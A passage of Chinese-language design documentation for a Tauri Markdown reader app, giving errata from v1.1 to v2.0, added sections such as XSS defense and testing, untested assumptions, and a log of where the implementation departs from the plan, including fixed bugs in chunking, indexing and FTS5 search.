## 附录 C：v1.1 → v2.0 勘误表

### 会导致代码无法运行的错误（已修正）

| # | 位置 | 原文问题 | 修正 |
|---|---|---|---|
| 1 | §6.5 | `Prefs` 类在模块顶层实例化，构造器内 `$effect` 会抛 **`effect_orphan`** 运行时错误 | 改为 setter 内做副作用 + `hydrate()` 方法；说明为何不用 `$effect.root` |
| 2 | §4.4 | `trait VaultAccess { async fn ... }` —— 含 async fn 的 trait **不是 dyn 兼容的**，且 `VaultId` 混用了「库」与「库内条目」两种语义 | 改为 `#[cfg]` 编译期分发 + 自由函数；类型拆为 `VaultRef` / `EntryRef` |
| 3 | §3.3 | `panic = "abort"` —— Tauri 移动端需要 unwind 把 Rust panic 传回 WebView，abort 会**直接杀进程闪退** | 移除该项，并补充「command 内禁用 unwrap」的配套约定与 clippy 规则 |
| 4 | §7.3 | FTS5 用 `content=''`（contentless）—— **无法调用 `snippet()`**，搜索结果无法显示命中上下文 | 改为 external content 表 + 三个同步触发器；补 trigram 的 3 字符下限说明 |
| 5 | §5.1 / §8.1 | 「先渲染后显示」与「滚动追加分块」两处描述**逻辑冲突**，未说明如何共存 | 明确 opacity 控制只作用于首屏块；增强管线改为接受 scope 参数的增量调用 |

### 其他技术性错误（已修正）

| # | 位置 | 问题 |
|---|---|---|
| 6 | §5.2 | 开启了 `ENABLE_SMART_PUNCTUATION`——会把正文里的 `--no-default-features` 转成 en dash，用户复制的命令跑不了。技术文档场景应关闭 |
| 7 | §5.4 | `hljs.registerLanguage(lang.name, lang)` 依赖打包后不可靠的 `.name`；且缺别名注册（```js / ```sh 不会高亮）；`highlightAll()` 与增量增强冲突 |
| 8 | §4.2 | `name.ends_with(".md")` **大小写敏感**，`README.MD` 会被漏掉；未跳过 `.git` 等隐藏目录（可能上万文件）；未排序（SAF 不保证返回顺序） |
| 9 | §6.6 | 只说「清除 `data-processed` 重渲染」但没提**必须预先保存 mermaid 原文**——渲染会用 SVG 覆盖原文本，之后无法恢复 |
| 10 | 全文 | 代码示例大量使用 `map_err(\|e\| e.to_string())`，把类型化错误压成字符串，前端无法分支处理 |

### 补齐的缺失内容

| 新增 | 内容 |
|---|---|
| §5.6 | **文本编码与换行符**：GBK/GB18030 回退、BOM 剥离（不剥会导致首行标题失效）、CRLF 规范化、文件大小上限 |
| §5.7 | **IPC 传输性能上限**：MB 级 HTML 经 JSON 序列化的开销评估与三条应对策略 |
| §9.4 | **XSS 防护**：md 允许 raw HTML + WebView 持有 IPC 通道 = 真实攻击面。CSP + ammonia 双层防护，含 ammonia 会剥掉标题 `id` 的陷阱 |
| §9.5 | **错误处理约定**：`AppError` 类型化错误 + code 分支，重点是 `PermissionExpired` |
| §9.6 | **测试策略**：五层测试矩阵 + `fixtures/` 魔鬼样本文档集清单 |
| §11.2 | 新增风险：恶意 Markdown 的 XSS（🔴 高） |
| §11.4 | 新增风险：SAF 持久化权限会失效（🟡 中，处理不好极易导致卸载） |
| §11.5 | 补充：`adoptedStyleSheets` 在老 Android WebView 不可用，需 feature detection |

### 仍需实测确认的假设

以下内容基于公开资料与经验推断，**开发时应在真机验证**，不要当成既定事实：

1. **APK 体积 4–5MB** —— 取决于 KaTeX 字体和 highlight.js 裁剪程度，实际可能更大
2. **首屏增强耗时 100–300ms** —— 中低端机上可能显著更长，M4 需实测
3. **`tauri-plugin-sql` 打包的 SQLite 是否启用 FTS5** —— 必须在 M4 用一条 `CREATE VIRTUAL TABLE` 验证，若未启用需换 `rusqlite` + `bundled` feature
4. **trigram 索引体积为原文 3–4 倍** —— 中文场景下的实际膨胀率需实测
5. **`tauri-plugin-android-fs` 的 `protocol-content` feature 能否稳定服务图片** —— 这是相对路径图片方案的关键依赖，建议 M3 优先打通


---

## 附录 D：实现状态与偏差（2026-10-18 追加）

本方案 v2.0 定稿时（2026-08）与当前实现存在若干偏差。以下记录**实际做法**，避免后人按文档改出错误结论。逐项任务与验收标准见 [架构改进计划](docs/架构改进计划.md)。

### D.1 与文档不一致的实现

| 项 | 文档写法 | 实际实现 | 原因 |
|---|---|---|---|
| KaTeX 版本 | `0.18.1`（§3.2） | `^0.16`（`package.json`） | 0.18 有 breaking；0.16 已覆盖所需能力 |
| SQLite 归属 | Rust 侧（§2 架构图） | 前端 `tauri-plugin-sql`（`src/lib/db.ts`） | 索引与检索的调用方都在前端，放 Rust 只会多一层 IPC |
| Android 权限 | capabilities 含 `android-fs:default`（§9.3） | 无该权限 | SAF 访问全走自定义命令，不经过插件 ACL |
| 图片加载 | asset 协议 / `protocol-content`（§4.3） | `read_image` 返回 base64 data URL | 绕开 asset 协议与 IPC 字节传输的不确定性；代价是体积 +33%、无 WebView 缓存 |
| 相对图片解析 | 渲染期在 Rust 用 `resolve_file_uri` 改写（§4.3） | 渲染期只写 `md-rel://` 哨兵，读取时由 `resolve_entry` 解析 | SAF 的 URI 解析是 **async**，而渲染回调是同步闭包——旧设计在此处不可实现 |
| 文件访问插件 | `tauri-plugin-fs`（§3.2/§3.3） | 已移除 | 桌面用 `std::fs`，Android 用 SAF，插件无调用点 |
| 渲染缓存 | `render_cache` 表（§8.2） | 进程内 `HashMap`（32 条，mtime 失效） | 跨会话缓存收益低，且 Android 无稳定 mtime |

### D.2 已修正的实现缺陷

以下问题在实现阶段发现并已修复（细节见改进计划）：

1. **分块不是容器感知的**：按 `<h2` 字符串切块会把 blockquote / `<details>` 切成两半。现改为「容器深度为 0 的 H2」才切。
2. **预处理不认围栏代码块**：代码块内的 `[TOC]`、`$$` 会被全局替换或翻转状态。现加围栏状态机。
3. **索引事件 fire-and-forget**：Rust 边 emit 边返回，前端写入仍在飞行。现改为前端驱动的顺序循环（有背压、有完成信号、错误可汇总）。
4. **索引为取纯文本做完整渲染**：现拆出 `extract_index`，只做一次 parser 遍历。
5. **`docs` 行只在建索引时创建**：导致阅读进度与书签在未索引时静默失效。现统一走 `ensureDoc`。
6. **FTS5 查询串未转义**：输入一个 `"` 即产生非法 MATCH 语法。现按 FTS5 规则把内部双引号写成两个。
7. **索引不清理已删除文件**：现索引结束后对账，先删 `doc_body` 再删 `docs`（否则 FTS 外部内容表的删除触发器读不到 title）。
8. **外链用 `window.open`**：Tauri WebView 会吞掉，点击无反应。现改用 `tauri-plugin-opener`。
9. **前端自行拼路径**：桌面可用、Android 必然失败，且与 Rust 实现重复。现收敛为 `resolve_entry` 单一入口。

### D.3 仍待验证的假设（更新 §11 风险清单）

- `ensureDoc` 之后，阅读进度/最近阅读/书签在「从未建索引」的库上是否全部正常（需真机/桌面端联调确认）。
- FTS5 `trigram` 下 `ORDER BY docs_fts.rank` 在 JOIN 场景的排序行为（若异常改为 `bm25()` 显式打分）。
- Android 父目录映射（`read_dir` 期间建立）在「冷启动后直接从书签打开深层文档」时可能为空，此时相对图片降级为加载失败。

### D.4 追加：检索层曾是「完全不可用」状态（2026-10-18 二次修复）

`docs_fts` 使用 `content='doc_body'` 的 external content 形式，FTS5 要求其声明列与内容表同名同存。
原设计把 `title` 列声明在 FTS 里、却只把 `body` 放进 `doc_body`，导致 `snippet()` 抛
`sqlite: SQL logic error`（内部是 `no such column: T.title`）。
`searchDocs()` 必然经过 `snippet()`，因此**跨文件搜索自始至终没有成功过一次**，
前端把它 catch 成一条 toast，表现为「搜不到结果」。

修复：`doc_body` 增加 `title` 列（触发器直接取 `new.title`，不再跨表子查询），
`indexDoc` 双写 title，并加迁移 v4 重建索引。回归脚本：`scripts/verify-fts.py`（24 项断言）。

> 附带结论：`ORDER BY docs_fts.rank` 在 JOIN 场景可用，无需改成 `bm25()`；
> 前提是上面的列匹配问题已修好。
